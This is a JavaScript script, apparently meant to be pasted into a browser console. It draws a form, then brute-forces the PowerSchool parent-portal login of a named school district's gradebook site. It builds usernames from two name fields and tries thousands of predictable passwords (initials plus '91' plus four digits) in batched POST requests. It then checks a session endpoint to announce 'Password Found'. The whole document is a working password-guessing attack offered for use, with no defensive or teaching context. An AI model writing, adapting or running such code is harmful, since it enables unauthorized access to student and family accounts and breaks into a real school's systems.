// Create input fields and a button
const userInput1 = document.createElement("input");
userInput1.type = "text";
userInput1.placeholder = "Enter your text";
userInput1.style.width = "70%";
userInput1.style.padding = "10px";
userInput1.style.marginBottom = "10px";
userInput1.style.border = "none";
userInput1.style.borderRadius = "5px";

const userInput2 = document.createElement("input");
userInput2.type = "text";
userInput2.placeholder = "Enter another text";
userInput2.style.width = "70%";
userInput2.style.padding = "10px";
userInput2.style.marginBottom = "10px";
userInput2.style.border = "none";
userInput2.style.borderRadius = "5px";

const submitButton = document.createElement("button");
submitButton.textContent = "Submit";
submitButton.style.backgroundColor = "#444";
submitButton.style.color = "#fff";
submitButton.style.padding = "10px 20px";
submitButton.style.border = "none";
submitButton.style.borderRadius = "5px";
submitButton.style.cursor = "pointer";
submitButton.style.marginBottom = "10px";
submitButton.addEventListener("click", function() {
	processInput();
	alert("Initiated, please wait approx 5 minutes...");
});

// Create close button
const closeButton = document.createElement("button");
closeButton.textContent = "Close";
closeButton.style.backgroundColor = "#f00";
closeButton.style.color = "#fff";
closeButton.style.padding = "10px 20px";
closeButton.style.border = "none";
closeButton.style.borderRadius = "5px";
closeButton.style.cursor = "pointer";
closeButton.style.marginBottom = "10px";
closeButton.addEventListener("click", () => {
    document.body.removeChild(promptContainer);
});

// Create container div
const promptContainer = document.createElement("div");
promptContainer.classList.add("prompt-container");
promptContainer.style.backgroundColor = "#333";
promptContainer.style.color = "#fff";
promptContainer.style.padding = "20px";
promptContainer.style.borderRadius = "10px";
promptContainer.style.textAlign = "center";
promptContainer.style.position = "absolute";
promptContainer.style.top = "50%";
promptContainer.style.left = "50%";
promptContainer.style.transform = "translate(-50%, -50%)";

// Append elements to the container div
promptContainer.appendChild(userInput1);
promptContainer.appendChild(userInput2);
promptContainer.appendChild(submitButton);
promptContainer.appendChild(closeButton); // Append close button

// Append the container div to the body
document.body.appendChild(promptContainer);

// Function to handle button click
async function processInput() {
    const userInput1Value = userInput1.value;
    const userInput2Value = userInput2.value;
    const username = userInput2Value + userInput1Value;

    const url = "https://gradebook.milforded.org/guardian/home.html";
    const batchSize = 1000;
    const delayBetweenBatches = 1000;

    async function sendBatch(startIndex) {
        const requests = [];
        for (let i = startIndex; i < Math.min(startIndex + batchSize, 9999); i++) {
            const password = userInput1Value.charAt(0).toUpperCase() + userInput2Value.charAt(0).toLowerCase() + '91' + pad(i, 4);
            const formData = new FormData();
            formData.append('dbpw', password);
            formData.append('translator_username', '');
            formData.append('translator_password', '');
            formData.append('translator_ldappassword', '');
            formData.append('returnUrl', '');
            formData.append('serviceName', 'PS Parent Portal');
            formData.append('serviceTicket', '');
            formData.append('pcasServerUrl', '%2F');
            formData.append('credentialType', 'User Id and Password Credential');
            formData.append('ldappassword', password);
            formData.append('account', username);
            formData.append('pw', password);
            formData.append('translatorpw', '');

            requests.push(fetch(url, {
                method: 'POST',
                body: formData,
                credentials: 'include'
            }));
        }

        await Promise.all(requests);

        // Check session status after each batch
        const response = await fetch("https://gradebook.milforded.org/ws/session/seconds-remaining");
        if (response.status === 200) {
            alert("Password Found.. Refresh Page");
            return;
        }
        if (response.status === 401) {
            alert("Testing.. Please wait");
            return;
        }
        // If session is still active, schedule the next batch
        const nextIndex = startIndex - batchSize; // Decrement startIndex for descending order
        if (nextIndex >= 1) {
            setTimeout(() => sendBatch(nextIndex), delayBetweenBatches);
        }
    }

    // Start sending batches
    await sendBatch(9000);
}

function pad(number, length) {
    let str = String(number);
    while (str.length < length) {
        str = '0' + str;
    }
    return str;
}
